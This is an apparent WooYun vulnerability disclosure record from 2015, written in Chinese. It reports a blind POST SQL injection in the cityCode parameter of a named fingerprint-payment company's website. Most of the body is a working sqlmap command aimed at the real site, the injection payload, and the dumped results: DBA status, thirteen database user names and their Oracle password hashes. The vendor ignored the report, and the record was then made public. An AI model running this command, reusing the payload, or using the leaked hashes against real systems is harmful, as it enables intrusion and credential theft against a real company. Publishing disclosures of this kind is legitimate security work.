{"id": 81097, "wybug_id": "wooyun-2015-0154495", "wybug_title": "上海立佰趣信息科技有限公司指付通主站存在POST型SQL注射漏洞（DBA权限+13名系统管理员密码泄露）", "wybug_corp": "上海立佰趣信息科技有限公司", "wybug_author": "路人甲", "wybug_date": "2015-11-20 18:17", "wybug_open_date": "2016-01-11 15:32", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注射漏洞"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-11-20：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2016-01-11：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： “上海立佰趣信息科技有限公司”（公司品牌“立佰趣”，英文品牌“Live By Touch”）成立于2006年2月，是一家以生物识别技术为核心的应用运营公司。目前公司已与中金（CICC）、君联（Legend Capital）、鼎晖投资（CDH）等世界一流中资财团进行战略合作。   立佰趣（Live By Touch）认为指纹鉴定学代表了芯片和密码之后的发展方向，凭借拥有世界排名前三位的核心指纹应用技术，与国内外诸多商业银行、知名商户及各行业合作伙伴进行全方位的合作，致力于推行无需任何介质的生物认证体系，从而弥补目前社会通行的介质认证体系所存在的一些缺憾。作为一家以生物识别技术为核心的应用运营公司，不断研发新的应用产品。目前，公司已经推出具有世界最先进水平的第一个生物识别技术应用产品：指付通（Pay By Finger）。该项目已于2010年开始正式运营。  详细说明：  地址：http://www.paybyfinger.com.cn\npython sqlmap.py -u \"http://www.paybyfinger.com.cn\" -p cityCode --technique=B --form --random-agent --batch --current-user --is-dba --users --passwords --dbs\n   漏洞证明：  \n---Parameter: cityCode (POST)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: homeinputusername=%E6%90%9C%E7%B4%A2%E5%95%86%E6%88%B7%E5%90%8D,%E5%9C%B0%E5%9D%80,%E5%88%86%E7%B1%BB%E7%AD%89&codeKey=ljxD&selectkey=&curPage=1&cityCode=0021' AND 9624=9624 AND 'HHvX'='HHvX---web application technology: Apache, JSPback-end DBMS: Oraclecurrent user:    'FPS'current user is DBA:    Truedatabase management system users [13]:[*] ALGORITHM[*] DBSNMP[*] FPS[*] OUTLN[*] PERFSTAT[*] PLATFORM[*] POINT[*] STRMADMIN[*] SYS[*] SYSTEM[*] WMSYS[*] ZABBIX[*] ZCTdatabase management system users password hashes:[*] ALGORITHM [1]:    password hash: 695B6259730A64FB[*] DBSNMP [1]:    password hash: E066D214D5421CCC[*] FPS [1]:    password hash: DC56B518968A5AE9[*] OUTLN [1]:    password hash: 4A3BA55E08595C81[*] PERFSTAT [1]:    password hash: 626A176E28C6CE55[*] PLATFORM [1]:    password hash: F8BC038657845D39[*] POINT [1]:    password hash: 7817F30648C47299[*] STRMADMIN [1]:    password hash: F7737B6F005CD1A1[*] SYS [1]:    password hash: BFE77DD10B99747E[*] SYSTEM [1]:    password hash: 420A4FCE8EDB1662[*] WMSYS [1]:    password hash: 7C9BA362F8314299[*] ZABBIX [1]:    password hash: 701322E64241BE07[*] ZCT [1]:    password hash: 1E67C73BCC1D7FE7sqlmap resumed the following injection point(s) from stored session:---Parameter: cityCode (POST)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: homeinputusername=%E6%90%9C%E7%B4%A2%E5%95%86%E6%88%B7%E5%90%8D,%E5%9C%B0%E5%9D%80,%E5%88%86%E7%B1%BB%E7%AD%89&codeKey=ljxD&selectkey=&curPage=1&cityCode=0021' AND 9624=9624 AND 'HHvX'='HHvX---web application technology: Apache, JSPback-end DBMS: Oraclesqlmap resumed the following injection point(s) from stored session:---Parameter: cityCode (POST)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: homeinputusername=%E6%90%9C%E7%B4%A2%E5%95%86%E6%88%B7%E5%90%8D,%E5%9C%B0%E5%9D%80,%E5%88%86%E7%B1%BB%E7%AD%89&codeKey=ljxD&selectkey=&curPage=1&cityCode=0021' AND 9624=9624 AND 'HHvX'='HHvX---web application technology: Apache, JSPback-end DBMS: Oracleavailable databases [10]:[*] ALGORITHM[*] FPS[*] OUTLN[*] PERFSTAT[*] PLATFORM[*] POINT[*] STRMADMIN[*] SYS[*] SYSTEM[*] WMSYS\n   修复方案：  上WAF。   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}